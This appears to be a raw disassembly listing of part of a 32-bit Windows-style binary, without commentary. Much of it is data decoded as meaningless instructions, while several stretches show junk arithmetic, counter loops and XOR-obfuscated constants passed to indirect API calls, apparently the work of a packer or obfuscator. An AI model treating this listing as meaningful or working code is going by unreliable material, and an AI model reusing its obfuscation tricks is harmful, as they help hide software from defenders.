  4052a7:	sar    bh,0x78
  4052aa:	aad    0x48
  4052ac:	retf   
  4052ad:	adc    ebx,DWORD PTR [ebx-0x57]
  4052b0:	inc    edi
  4052b1:	sbb    ch,dl
  4052b3:	inc    edi
  4052b4:	ror    esp,1
  4052b6:	pop    ecx
  4052b7:	mov    dl,0xc1
  4052b9:	icebp  
  4052ba:	push   esp
  4052bb:	es dec edx
  4052bd:	pop    edx
  4052be:	imul   ecx,DWORD PTR [ebx-0x41],0x6a
  4052c2:	jb     0x405326
  4052c4:	rcr    al,1
  4052c6:	mov    BYTE PTR [edi-0x60],dl
  4052c9:	add    eax,0x7657f5f2
  4052ce:	xchg   esi,eax
  4052cf:	and    eax,0x569730c7
  4052d4:	or     eax,0x6227c204
  4052d9:	push   ds
  4052da:	mov    ebx,0xff0e0e3f
  4052df:	inc    esp
  4052e0:	je     0x405354
  4052e2:	ja     0x405341
  4052e4:	xor    bl,BYTE PTR [eax]
  4052e6:	jb     0x4052c7
  4052e8:	sub    DWORD PTR [edi+edx*4],edi
  4052eb:	(bad)  
  4052ec:	lods   eax,DWORD PTR ds:[esi]
  4052ed:	pop    esp
  4052ee:	dec    ecx
  4052ef:	mov    ebx,0x55373f1a
  4052f4:	dec    eax
  4052f5:	pop    ss
  4052f6:	mov    ch,BYTE PTR [ecx-0x43]
  4052f9:	mov    WORD PTR [edx+esi*8+0x29],cs
  4052fd:	sub    ebp,esp
  4052ff:	push   0xffffffcf
  405301:	sar    BYTE PTR [ebp-0x20967194],0xd4
  405308:	int3   
  405309:	sub    DWORD PTR [esi+0x18],eax
  40530c:	cli    
  40530d:	(bad)
  405311:	popa   
  405312:	repz jp 0x40537d
  405315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405316:	ret    0xe9f
  405319:	cmp    bh,bl
  40531b:	shl    BYTE PTR gs:[ecx-0x5d],1
  40531f:	or     eax,0x9d473038
  405324:	fild   WORD PTR [ebx]
  405326:	sbb    eax,0x1f601116
  40532b:	dec    ebp
  40532c:	adc    edi,DWORD PTR [ebp-0x3b]
  40532f:	push   0x8b550d73
  405334:	and    cl,bh
  405336:	sub    BYTE PTR [ecx+0x2b],0xde
  40533a:	inc    eax
  40533b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40533c:	mov    ah,BYTE PTR [ecx-0x7e]
  40533f:	add    bh,al
  405341:	lds    edi,FWORD PTR [edx+edi*8+0x663e8f38]
  405348:	jnp    0x405349
  40534a:	in     eax,0xd6
  40534c:	mov    WORD PTR ds:0x39b3b5ed,?
  405352:	push   ebx
  405353:	and    DWORD PTR [edx],edi
  405355:	dec    esp
  405356:	das    
  405357:	call   0xaa74017b
  40535c:	(bad)  
  40535d:	xlat   BYTE PTR ds:[ebx]
  40535e:	mov    ds:0x4b4d064c,al
  405363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405364:	add    DWORD PTR [ecx+edx*1+0x5d],ebp
  405368:	leave  
  405369:	mov    cl,0x5e
  40536b:	mov    edi,0x1406549d
  405370:	sub    ebp,DWORD PTR [ebp+0x62]
  405373:	pop    edi
  405374:	push   edi
  405375:	nop
  405376:	pop    esi
  405377:	fs sbb al,0x48
  40537a:	mov    ah,BYTE PTR [esi-0x38]
  40537d:	pop    esi
  40537e:	bound  esi,QWORD PTR [edi-0x39]
  405381:	pop    ebp
  405382:	test   DWORD PTR [ecx-0x53],ebp
  405385:	rol    BYTE PTR [ebp-0x63cc36c5],0xeb
  40538c:	mov    eax,ds:0xd6dcb8dd
  405391:	hlt    
  405392:	je     0x405361
  405394:	shl    dl,0xde
  405397:	int3   
  405398:	jbe    0x405354
  40539a:	push   ebp
  40539b:	cmp    DWORD PTR [edx+0x49],ebx
  40539e:	imul   edx,DWORD PTR [edi-0x13688fa9],0x65
  4053a5:	loope  0x405370
  4053a7:	int    0xe9
  4053a9:	aas    
  4053aa:	mov    fs,edi
  4053ac:	cwde   
  4053ad:	add    esp,DWORD PTR [esi-0x1f3755e6]
  4053b3:	popa   
  4053b4:	sbb    DWORD PTR [ebp+0x58c916c],0x4e
  4053bb:	and    BYTE PTR [edi],dl
  4053bd:	fld    QWORD PTR ds:[eax]
  4053c0:	and    DWORD PTR [esi-0x73],edx
  4053c3:	jb     0x405366
  4053c5:	loopne 0x40541b
  4053c7:	mov    eax,ss
  4053c9:	xor    ch,dl
  4053cb:	adc    al,0x24
  4053cd:	rcr    BYTE PTR [edx+0x2d94db94],cl
  4053d3:	stc    
  4053d4:	xor    BYTE PTR [esi+0xb],0x6c
  4053d8:	fld    TBYTE PTR [edi+0x58f31699]
  4053de:	cmp    edi,DWORD PTR [ebx+esi*1-0x11034b9c]
  4053e5:	dec    edx
  4053e6:	imul   edi,ebx,0x9b4affc6
  4053ec:	(bad)  
  4053ed:	and    eax,0x50edc35f
  4053f2:	sub    edx,DWORD PTR [eax+0x4fa070e5]
  4053f8:	sbb    DWORD PTR [ecx+ebx*8+0x6e],edi
  4053fc:	adc    ebp,ebp
  4053fe:	jmp    0x4053eb
  405400:	jmp    0x69e9b2dd
  405405:	sub    dh,0x3f
  405408:	pop    ds
  405409:	leave  
  40540a:	dec    esi
  40540b:	inc    edx
  40540c:	data16 gs ins BYTE PTR es:[edi],dx
  40540f:	stos   DWORD PTR es:[edi],eax
  405410:	test   DWORD PTR [eax+0x8],ecx
  405413:	leave  
  405414:	jg     0x405492
  405416:	xchg   bh,dh
  405418:	jmp    0xf4d18e6f
  40541d:	mov    ecx,0xef503674
  405422:	lea    edi,[ebp-0x2eb0a397]
  405428:	mov    ?,WORD PTR [edi]
  40542a:	jle    0x40543d
  40542c:	mov    eax,0x3f1b63b1
  405431:	stos   DWORD PTR es:[edi],eax
  405432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405433:	scas   eax,DWORD PTR es:[edi]
  405434:	mov    eax,ds:0x75a0547d
  405439:	loopne 0x4053ed
  40543b:	sbb    eax,0xa2eba37c
  405440:	jge    0x4053e9
  405442:	sub    DWORD PTR [ebx-0x2f],ecx
  405445:	imul   eax,DWORD PTR [ebp+0x68b65b06],0x284b4eeb
  40544f:	mov    ds:0x8d66a68b,al
  405454:	xchg   edx,eax
  405455:	cmp    BYTE PTR [edx-0x3],bh
  405458:	add    esp,DWORD PTR [edx-0x69]
  40545b:	jmp    0x405400
  40545d:	dec    eax
  40545e:	mov    dl,0x7f
  405460:	push   esi
  405461:	push   edi
  405462:	ins    BYTE PTR es:[edi],dx
  405463:	jl     0x405460
  405465:	mov    al,ds:0xd39c18cb
  40546a:	test   BYTE PTR [ecx+0x4fbbe951],0xa7
  405471:	sbb    bl,BYTE PTR [edi-0x5a]
  405474:	aam    0x74
  405476:	and    al,0xb3
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x9ca2c60a
  4055e5:	pop    esp
  4055e6:	inc    ebp
  4055e7:	add    esi,DWORD PTR [esi]
  4055e9:	sub    bh,BYTE PTR [esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x4055d0
  4055f1:	inc    ebp
  4055f2:	sbb    edx,DWORD PTR [edi+0x8]
  4055f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f6:	out    dx,al
  4055f7:	add    dh,ah
  4055f9:	ins    DWORD PTR es:[edi],dx
  4055fa:	pop    edi
  4055fb:	sub    ecx,DWORD PTR [edi+0x44]
  4055fe:	rcr    BYTE PTR [edi-0x58dc65c7],cl
  405604:	mov    ds:0x961d98c6,eax
  405609:	sub    esi,DWORD PTR [ebx-0x294f849b]
  40560f:	push   eax
  405610:	jne    0x405685
  405612:	retf   0x9385
  405615:	add    edi,DWORD PTR [edx-0x4f4b2e68]
  40561b:	cmp    eax,0xce06ea5f
  405620:	mov    eax,ds:0x4f5b374f
  405625:	mov    esi,DWORD PTR [eax]
  405627:	popf   
  405628:	mov    edi,0x676a9b36
  40562d:	pushf  
  40562e:	shl    al,0x80
  405631:	stos   BYTE PTR es:[edi],al
  405632:	mov    ebp,0x68b4b0df
  405637:	mov    edi,0xe779074c
  40563c:	stc    
  40563d:	ret    
  40563e:	mov    fs,WORD PTR [ebx]
  405640:	in     al,0x24
  405642:	pop    ds
  405643:	out    0x38,eax
  405645:	adc    dl,BYTE PTR [eax+0x0]
  405648:	inc    ecx
  405649:	js     0x405631
  40564b:	and    DWORD PTR [eax+ebp*4+0x57],0xbab293af
  405653:	in     al,dx
  405654:	push   ebp
  405655:	dec    esp
  405656:	fiadd  WORD PTR [esi-0x328c71a6]
  40565c:	aaa    
  40565d:	add    eax,0x8d635427
  405662:	push   es
  405663:	aaa    
  405664:	sbb    esi,ecx
  405666:	pop    ebx
  405667:	jo     0x4056dd
  405669:	pop    ss
  40566a:	ret    
  40566b:	retf   0x833d
  40566e:	fcomp  QWORD PTR [edi+ebp*8-0x6ff7e24b]
  405675:	xchg   BYTE PTR ds:0x7da56f87,ch
  40567b:	push   ebp
  40567c:	adc    eax,0x2824cfcb
  405681:	gs jne 0x40567b
  405684:	fs test eax,0x3842183b
  40568a:	retf   
  40568b:	and    al,0x2b
  40568d:	dec    ebx
  40568e:	pop    ss
  40568f:	idiv   BYTE PTR [ebx]
  405691:	sub    eax,0xe492d80
  405696:	pop    ss
  405697:	gs sub edi,edx
  40569a:	dec    edx
  40569b:	dec    esp
  40569c:	sti    
  40569d:	cs cwde 
  40569f:	jmp    0x71099a38
  4056a4:	mov    dh,BYTE PTR [ebx-0x79]
  4056a7:	xor    DWORD PTR [ebp-0xa],ecx
  4056aa:	fldcw  WORD PTR [edx]
  4056ac:	fdivr  st(5),st
  4056ae:	ja     0x4056ba
  4056b0:	inc    edi
  4056b1:	cld    
  4056b2:	aas    
  4056b3:	sbb    eax,DWORD PTR [esi-0x1a]
  4056b6:	fist   WORD PTR [ecx+0x21]
  4056b9:	pop    ebx
  4056ba:	jo     0x4056eb
  4056bc:	jmp    0x58e4:0x17f6151a
  4056c3:	dec    ebx
  4056c4:	mov    bl,0x1e
  4056c6:	(bad)
  4056c9:	aaa    
  4056ca:	adc    esi,ecx
  4056cc:	sbb    DWORD PTR [eax+0x3d1bd40a],esp
  4056d2:	leave  
  4056d3:	fisttp DWORD PTR [edi]
  4056d5:	lea    edi,[edx+0x64]
  4056d8:	shl    al,0x6d
  4056db:	sub    al,0x3a
  4056dd:	mov    bl,0x18
  4056df:	add    ebp,esi
  4056e1:	push   ecx
  4056e2:	pop    ds
  4056e3:	fsubr  QWORD PTR ds:0x143552aa
  4056e9:	mov    al,0x89
  4056eb:	mov    edi,DWORD PTR [esi]
  4056ed:	out    0x9,al
  4056ef:	out    0x8,eax
  4056f1:	(bad)  
  4056f2:	cwde   
  4056f3:	push   edi
  4056f4:	dec    edx
  4056f5:	cmp    DWORD PTR [edi-0x1aafab4b],eax
  4056fb:	pop    eax
  4056fc:	jo     0x4056ed
  4056fe:	(bad)  
  4056ff:	data16 sub BYTE PTR [edi],0xc1
  405703:	jl     0x4056d5
  405705:	xchg   edx,eax
  405706:	and    ecx,DWORD PTR [ebp+0x4a]
  405709:	push   es
  40570a:	xchg   ecx,eax
  40570b:	adc    eax,0x741d5259
  405710:	mov    dh,0x5e
  405712:	test   al,0x40
  405714:	xchg   esi,eax
  405715:	mov    ah,0x8a
  405717:	add    cl,BYTE PTR [ecx+0x37f49e10]
  40571d:	mov    ah,0x1c
  40571f:	dec    esp
  405720:	pop    edx
  405721:	push   0xffffffc8
  405723:	sbb    BYTE PTR [eax+0x28],bl
  405726:	lea    esi,ds:0x2904f20f
  40572c:	mov    al,ds:0x45781e88
  405731:	jbe    0x405718
  405733:	inc    esp
  405734:	icebp  
  405735:	loopne 0x4056ba
  405737:	sub    BYTE PTR [ebx+0xc],bh
  40573a:	xchg   ebp,eax
  40573b:	test   ebp,ecx
  40573d:	sbb    BYTE PTR [esi-0x50df1395],ch
  405743:	dec    edi
  405744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405745:	push   edx
  405746:	mov    bl,0x6d
  405748:	inc    esi
  405749:	add    eax,0x67701ac
  40574e:	in     eax,dx
  40574f:	push   edx
  405750:	pslld  mm1,QWORD PTR [ebx]
  405753:	dec    edi
  405755:	push   ebp
  405756:	int    0xb1
  405758:	in     eax,dx
  405759:	jmp    0x40577e
  40575b:	or     ecx,edi
  40575d:	fnstsw WORD PTR [ebx]
  40575f:	pop    ecx
  405760:	fisubr WORD PTR [ebx+0x71]
  405763:	aaa    
  405764:	xchg   ebx,eax
  405765:	dec    esp
  405766:	fld    st(4)
  405768:	bnd jp 0x40570e
  40576b:	push   ds
  40576c:	scas   eax,DWORD PTR es:[edi]
  40576d:	xor    ch,cl
  40576f:	in     eax,dx
  405770:	pop    ds
  405771:	in     al,0xb6
  405773:	sahf   
  405774:	adc    BYTE PTR [esi+0x79],cl
  405777:	mov    edx,0x93b83368
  40577c:	fldenv [edx-0x73850ff7]
  405782:	xor    ebp,DWORD PTR [ebx+ebx*4]
  405785:	adc    ebp,DWORD PTR [ecx+0x4fea1162]
  40578b:	mov    bh,0xe6
  40578d:	inc    edx
  40578e:	mov    dl,0x4b
  405790:	jbe    0x4057cc
  405792:	inc    ecx
  405793:	iret   
  405794:	inc    esi
  405795:	aas    
  405796:	push   esi
  405797:	imul   esi,DWORD PTR [edi],0x5f2f0117
  40579d:	pop    ss
  40579e:	retf   
  40579f:	sub    eax,0xa9a1140f
  4057a4:	push   edi
  4057a5:	sbb    ebx,DWORD PTR [eax]
  4057a7:	push   ss
  4057a8:	aas    
  4057a9:	mov    ebp,0x3585ff3
  4057ae:	aas    
  4057af:	pinsrw mm6,WORD PTR [eax+0x33abb57c],0xc9
  4057b7:	sahf   
  4057b8:	out    0x9a,eax
  4057ba:	sub    BYTE PTR [edi+esi*4],0x53
  4057be:	pusha  
  4057bf:	sbb    cl,ch
  4057c1:	data16 xor al,0xb7
  4057c4:	jae    0x405782
  4057c6:	inc    edx
  4057c7:	sbb    DWORD PTR [ebx+0x45c71eac],edx
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	fucomi st,st(5)
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42eddb3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	mov    ds:0xd0a2d83,al
  4059a7:	sub    BYTE PTR [esi+0x7e],bh
  4059aa:	push   ebp
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059aa
  4059af:	ffreep st(1)
  4059b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b2:	mov    cl,0xde
  4059b4:	ret    
  4059b5:	push   esp
  4059b6:	dec    edx
  4059b7:	mov    cl,0xeb
  4059b9:	pop    es
  4059ba:	stos   DWORD PTR es:[edi],eax
  4059bb:	jbe    0x405a18
  4059bd:	pop    ebp
  4059be:	sub    DWORD PTR [ebp-0x5f3e3f1b],esi
  4059c4:	test   DWORD PTR [edx+0x36],ebx
  4059c7:	les    ebp,FWORD PTR [edx+0x5213c640]
  4059cd:	shr    BYTE PTR [edx+0x19480bac],1
  4059d3:	push   es
  4059d4:	je     0x405a12
  4059d6:	aas    
  4059d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059d8:	test   eax,0xfa706a8d
  4059dd:	adc    DWORD PTR [ebx],ecx
  4059df:	cmp    al,0x6c
  4059e1:	xor    BYTE PTR [esi],bh
  4059e3:	or     al,0xfb
  4059e5:	inc    edi
  4059e6:	sbb    esi,ebx
  4059e8:	leave  
  4059e9:	push   ss
  4059ea:	mov    al,ds:0x7273bdc9
  4059ef:	and    eax,0x18e7b778
  4059f4:	push   ss
  4059f5:	jno    0x40597b
  4059f7:	push   es
  4059f8:	je     0x13770f67
  4059fe:	push   ebp
  4059ff:	pop    ds
  405a00:	pop    eax
  405a01:	and    BYTE PTR [esi],al
  405a03:	xor    cl,BYTE PTR ds:0x6fc7098e
  405a09:	mov    esi,DWORD PTR ds:0x914b99e5
  405a0f:	lds    edx,FWORD PTR [esi]
  405a11:	loop   0x4059ec
  405a13:	ins    DWORD PTR es:[edi],dx
  405a14:	xchg   ebp,eax
  405a15:	js     0x405a42
  405a17:	adc    DWORD PTR [edx+0x3a],esi
  405a1a:	inc    ebp
  405a1b:	jle    0x405a83
  405a1d:	mov    ds:0x320637b5,eax
  405a22:	rcr    BYTE PTR [eax+ebp*8+0x77],0x60
  405a27:	mov    dh,dh
  405a29:	dec    edi
  405a2a:	dec    eax
  405a2b:	mov    bh,BYTE PTR ss:[edi-0x1498dfac]
  405a32:	pop    eax
  405a33:	jle    0x405a82
  405a35:	xchg   edx,eax
  405a36:	inc    edx
  405a37:	repnz dec edi
  405a39:	or     ebp,DWORD PTR [eax+ecx*2-0x469392de]
  405a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a41:	xor    ecx,DWORD PTR [edx]
  405a43:	or     DWORD PTR [ecx],ebx
  405a45:	leave  
  405a46:	mov    ah,0x8e
  405a48:	push   cs
  405a49:	sub    DWORD PTR [esi+0x63b58a78],eax
  405a4f:	push   edi
  405a50:	inc    esp
  405a51:	inc    BYTE PTR [eax-0xbdf652b]
  405a57:	pusha  
  405a58:	adc    DWORD PTR [esi-0x46],0x18
  405a5c:	stos   DWORD PTR es:[edi],eax
  405a5d:	shl    DWORD PTR [ebp-0x50fb791],1
  405a63:	cmp    al,0xe7
  405a65:	and    BYTE PTR [edi+0x114e0e35],bh
  405a6b:	sbb    al,0x76
  405a6d:	mov    ecx,DWORD PTR [edx+0x68]
  405a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a71:	stc    
  405a72:	mov    ecx,0x805e1779
  405a77:	fwait
  405a78:	nop
  405a79:	pop    edi
  405a7a:	pop    es
  405a7b:	or     al,0xb0
  405a7d:	fld    TBYTE PTR [eax+0x339dbcbc]
  405a83:	mov    ch,0x5f
  405a85:	mov    cl,0xc4
  405a87:	jmp    0x993f0998
  405a8c:	pop    ecx
  405a8d:	jne    0x405a9d
  405a8f:	(bad)  
  405a90:	div    BYTE PTR [edi+0x651efe48]
  405a96:	jmp    0x7bccadb4
  405a9b:	mov    cl,0x68
  405a9d:	in     eax,dx
  405a9e:	icebp  
  405a9f:	loopne 0x405a9b
  405aa1:	in     al,0x22
  405aa3:	(bad)  [esi-0x5063ea9]
  405aa9:	mov    cl,0x5c
  405aab:	dec    eax
  405aac:	cwde   
  405aad:	xchg   esi,eax
  405aae:	call   0xb588:0x3e21e4e2
  405ab5:	daa    
  405ab6:	pop    edx
  405ab7:	rcr    BYTE PTR [edi-0x35],cl
  405aba:	(bad)  
  405abb:	and    ecx,eax
  405abd:	sti    
  405abe:	icebp  
  405abf:	ficomp DWORD PTR [edi-0x79]
  405ac2:	mov    esp,0xec15bb46
  405ac7:	mov    ds:0xa1284d28,eax
  405acc:	sbb    eax,0x2782f5aa
  405ad1:	xor    ebp,eax
  405ad3:	test   DWORD PTR [ecx-0x4ac5f53d],edi
  405ad9:	inc    ecx
  405ada:	pusha  
  405adb:	xchg   esi,eax
  405adc:	jns    0x405a68
  405ade:	iret   
  405adf:	and    BYTE PTR [esi-0x689994e8],bl
  405ae5:	pop    ebx
  405ae6:	pop    ds
  405ae7:	mov    gs,WORD PTR [ebp-0x7c8c11bd]
  405aed:	mov    bl,0x83
  405aef:	sbb    BYTE PTR [eax+0x69],0x82
  405af3:	cmp    ebp,edx
  405af5:	mov    ds:0xb5dcf8f4,eax
  405afa:	(bad)  
  405afb:	jecxz  0x405a7f
  405afd:	pop    ebp
  405afe:	push   ebx
  405aff:	inc    esp
  405b00:	mov    fs,WORD PTR [esi+ecx*2-0x70685dba]
  405b07:	push   ss
  405b08:	mov    DWORD PTR [edi+0xd],esp
  405b0b:	and    eax,0x146da2c6
  405b10:	outs   dx,BYTE PTR ds:[esi]
  405b11:	pop    edx
  405b12:	jae    0x405b0d
  405b14:	in     eax,0x4d
  405b16:	stos   BYTE PTR es:[edi],al
  405b17:	inc    ecx
  405b18:	push   cs
  405b19:	dec    ebp
  405b1a:	fs shl edx,1
  405b1d:	adc    eax,0x625278b0
  405b22:	mov    ecx,DWORD PTR [esi-0x5c]
  405b25:	icebp  
  405b26:	cmp    DWORD PTR [edx+ebp*8-0x406af704],edi
  405b2d:	js     0x405b27
  405b2f:	inc    eax
  405b30:	test   DWORD PTR [esi],edx
  405b32:	xchg   ebx,eax
  405b33:	out    dx,al
  405b34:	sahf   
  405b35:	(bad)  
  405b36:	mov    dh,0xc8
  405b38:	lahf   
  405b39:	jns    0x405b56
  405b3b:	and    BYTE PTR [edx+0x51],dh
  405b3e:	div    BYTE PTR [ebx+0x5ae6714c]
  405b44:	fs stc 
  405b46:	das    
  405b47:	xlat   BYTE PTR ds:[ebx]
  405b48:	cmc    
  405b49:	xchg   edi,eax
  405b4a:	cld    
  405b4b:	jp     0x405b15
  405b4d:	xchg   BYTE PTR [edi+ecx*1-0x26055b5],bl
  405b54:	adc    eax,0x319eb443
  405b59:	in     al,0xa7
  405b5b:	pop    ecx
  405b5c:	mov    ds:0x85d786b2,eax
  405b61:	inc    ebx
  405b62:	arpl   WORD PTR [edx],cx
  405b64:	add    dh,BYTE PTR [ecx+0x3d]
  405b67:	xor    al,0xdf
  405b69:	fldenv ds:0x4b3931b5
  405b6f:	shl    DWORD PTR [eax+0x19],0x59
  405b73:	and    al,0x86
  405b75:	mov    edx,0x6dba4b49
  405b7a:	sub    BYTE PTR [ecx-0xd],al
  405b7d:	push   0x37c06490
  405b82:	inc    ebp
  405b83:	xor    eax,0x6fb93197
  405b88:	mov    BYTE PTR [ebx-0x39cc13bb],cl
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
